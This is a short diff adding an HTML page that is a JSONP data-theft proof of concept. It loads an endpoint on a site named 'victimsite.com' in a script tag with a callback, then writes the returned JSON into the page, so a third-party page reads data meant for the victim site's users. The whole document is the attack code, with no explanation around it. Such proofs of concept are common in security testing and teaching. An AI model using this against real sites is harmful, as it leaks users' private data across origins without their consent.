@@ -1,0 +1,7 @@
+<div id='A1'></div> 
+<script type='text/javascript'> 
+   function myCallback(data)
+      { document.getElementById('A1').innerHTML = Object.values(data); } 
+</script> 
+<script src='https://www.victimsite.com/JSONPEndpoint?callback=myCallback'>
+</script>
